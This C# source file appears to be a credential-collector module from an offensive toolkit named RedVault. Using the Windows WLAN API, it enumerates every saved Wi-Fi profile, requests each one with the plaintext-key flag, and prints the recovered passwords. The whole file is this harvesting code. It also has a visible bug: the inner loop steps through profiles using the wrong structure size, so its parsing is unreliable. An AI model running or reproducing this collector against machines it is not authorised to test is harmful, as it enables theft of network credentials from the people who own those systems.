using System;
using System.Collections.Generic;
using System.Runtime.InteropServices;
using System.Text;
using System.Xml.Linq;
using static RedVault.Modules.m_wlan;

namespace RedVault.Collectors.DPAPI
{
    internal class Wifi
    {

        public static void Run()
        {
            Console.WriteLine("[Enumerating Wifi Passwords...]");
            uint result = WlanOpenHandle(2, IntPtr.Zero, out uint apiversion, out IntPtr cHandle);
             
            if (result != 0)
            {
                Console.WriteLine($"WlanOpenHandle failed with error: {result}");
                return;
            }

            result = WlanEnumInterfaces(cHandle, IntPtr.Zero, out IntPtr pIntList);

            if (result != 0) 
            {
                Console.WriteLine($"WlanEnumInterfaces failed with error: {result}");
                return;
            }
            uint numberofitems = Marshal.PtrToStructure<WLAN_INTERFACE_INFO_LIST>(pIntList).NumberOfItems;

            Console.WriteLine($"Found interfaces: { numberofitems}");

            int headersize  = Marshal.SizeOf<WLAN_INTERFACE_INFO_LIST>();
            
            var baseAdr = IntPtr.Add(pIntList, headersize);
            
            for (int i = 0; i < numberofitems; i++) 
            {
                IntPtr current = IntPtr.Add(baseAdr, i * Marshal.SizeOf<WLAN_INTERFACE_INFO>());

                WLAN_INTERFACE_INFO intInfo = Marshal.PtrToStructure<WLAN_INTERFACE_INFO>(current);


                result = WlanGetProfileList(cHandle, ref intInfo.InterfaceGuid, IntPtr.Zero, out IntPtr pProfileList);

                if (result != 0)
                {
                    Console.WriteLine($"WlanGetProfileList failed with error: {result}");
                    return;
                }
                // Using *2* subfix for WLAN_PROFILE_INFO vars

                uint numberofitems2 = Marshal.PtrToStructure<WLAN_PROFILE_INFO_LIST>(pProfileList).NumberOfItems;

                int headersize2 = Marshal.SizeOf<WLAN_PROFILE_INFO_LIST>();

                var baseAdr2 = IntPtr.Add(pProfileList, headersize2);

                for (int i2 = 0; i2 < numberofitems2; i2++)
                {
                    IntPtr current2 = IntPtr.Add(baseAdr2, i2 * Marshal.SizeOf<WLAN_INTERFACE_INFO>());

                    WLAN_PROFILE_INFO profileInfo = Marshal.PtrToStructure<WLAN_PROFILE_INFO>(current2);

                    uint flags = 0x00000004; // WLAN_PROFILE_GET_PLAINTEXT_KEY

                    Console.WriteLine($"Profile: {profileInfo.ProfileName}");
                    

                    result = WlanGetProfile(cHandle, ref intInfo.InterfaceGuid, profileInfo.ProfileName, IntPtr.Zero, out IntPtr pProfileXml, ref flags, out _);

                    if (result != 0) 
                    {
                        Console.WriteLine($"WlanGetProfile failed with error: {result}");
                        return;

                    }

                    string xml = Marshal.PtrToStringUni(pProfileXml);

                    int start = xml.IndexOf("<keyMaterial>");

                    if (start != -1)
                    {
                        int end = xml.IndexOf("</keyMaterial>", start);

                        if (end != -1)
                        {
                            int valueStart = start + "<keyMaterial>".Length;

                            string keyContent = xml.Substring(valueStart, end - valueStart);
                            Console.WriteLine($"Key: {keyContent}");
                        }
                        else
                        {
                            Console.WriteLine("[-] No key end tag found");
                        }

                    }
                    else
                    {
                        Console.WriteLine("[-] No key material found");
                    }
                    WlanFreeMemory(pProfileXml);

                }

                WlanFreeMemory(pProfileList);

            }

            WlanFreeMemory(pIntList);
            WlanCloseHandle(cHandle, IntPtr.Zero);
        }



    }
}
